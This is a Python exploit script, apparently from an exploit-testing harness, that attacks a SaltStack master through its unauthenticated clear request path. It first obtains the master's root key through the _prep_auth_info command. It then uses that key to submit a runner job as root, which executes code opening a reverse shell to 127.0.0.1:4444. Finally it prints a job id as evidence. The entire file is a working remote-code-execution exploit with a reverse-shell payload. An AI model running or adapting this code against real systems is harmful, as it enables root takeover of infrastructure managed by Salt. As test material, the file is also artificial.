#!/usr/bin/env python3
"""Execute a shell through Salt's unauthenticated clear request path."""

import datetime
import importlib
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import urllib.parse


def load_client_modules() -> tuple[object, object]:
    try:
        return importlib.import_module("zmq"), importlib.import_module("msgpack")
    except ImportError:
        directory = Path(tempfile.mkdtemp(prefix="saltstack-001-client-"))
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "--disable-pip-version-check",
             "--no-cache-dir", "--quiet", "--target", str(directory),
             "pyzmq==27.1.0", "msgpack==1.1.1"],
            check=True,
            stdout=subprocess.DEVNULL,
        )
        sys.path.insert(0, str(directory))
        return importlib.import_module("zmq"), importlib.import_module("msgpack")


def send_clear_request(endpoint: str, load: dict, zmq: object,
                       msgpack: object) -> object:
    context = zmq.Context.instance()
    connection = context.socket(zmq.REQ)
    connection.setsockopt(zmq.RCVTIMEO, 30000)
    connection.setsockopt(zmq.SNDTIMEO, 30000)
    connection.connect(endpoint)
    try:
        connection.send(msgpack.packb({"enc": "clear", "load": load},
                                      use_bin_type=False))
        return msgpack.unpackb(connection.recv(), raw=False)
    finally:
        connection.close()


def build_shell_code() -> str:
    shell = (
        "import os,socket;"
        "s=socket.create_connection(('127.0.0.1',4444));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
        "os.execl('/bin/sh','sh','-i')"
    )
    return (
        "import subprocess,sys;"
        "subprocess.Popen([sys.executable,'-c'," + repr(shell) + "],"
        "stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,"
        "stderr=subprocess.DEVNULL,start_new_session=True)"
    )


def main() -> None:
    target = urllib.parse.urlsplit(os.environ["REMOTE_TARGET_URL"])
    if not target.hostname:
        raise RuntimeError("target URL lacks a host")
    endpoint = f"tcp://{target.hostname}:{target.port or 80}"
    zmq, msgpack = load_client_modules()
    auth_info = send_clear_request(endpoint, {"cmd": "_prep_auth_info"},
                                   zmq, msgpack)
    if not (isinstance(auth_info, list) and len(auth_info) > 2
            and isinstance(auth_info[2], dict) and len(auth_info[2]) == 1):
        raise RuntimeError("Salt did not disclose its master key")
    root_key = next(iter(auth_info[2].values()))
    jid = datetime.datetime.now(datetime.timezone.utc).strftime(
        "%Y%m%d%H%M%S%f")
    response = send_clear_request(endpoint, {
        "key": root_key,
        "cmd": "runner",
        "fun": "salt.cmd",
        "kwarg": {"fun": "cmd.exec_code", "lang": "python3",
                  "code": build_shell_code()},
        "jid": jid,
        "user": "root",
    }, zmq, msgpack)
    if not isinstance(response, dict) or "jid" not in response:
        raise RuntimeError("Salt rejected the runner request")
    print(json.dumps({"evidence_payload": {"runner_jid": jid}}))


if __name__ == "__main__":
    main()
